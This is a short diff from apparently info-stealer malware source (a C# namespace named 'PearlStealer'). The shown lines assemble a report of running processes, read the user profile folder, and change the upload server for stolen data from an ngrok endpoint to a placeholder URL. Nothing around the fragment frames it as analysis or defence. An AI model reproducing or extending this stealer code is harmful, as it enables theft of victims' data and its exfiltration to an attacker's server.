@@ -85,7 +85,7 @@ namespace PearlStealer
                                         $"--- PROCESSES ---\n" +
                                         $"{processes}";
 
-                string server = "https://factiously-nasolacrimal-minh.ngrok-free.dev/upload";
+                string server = "https://server.io";
 
                 string profileFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 
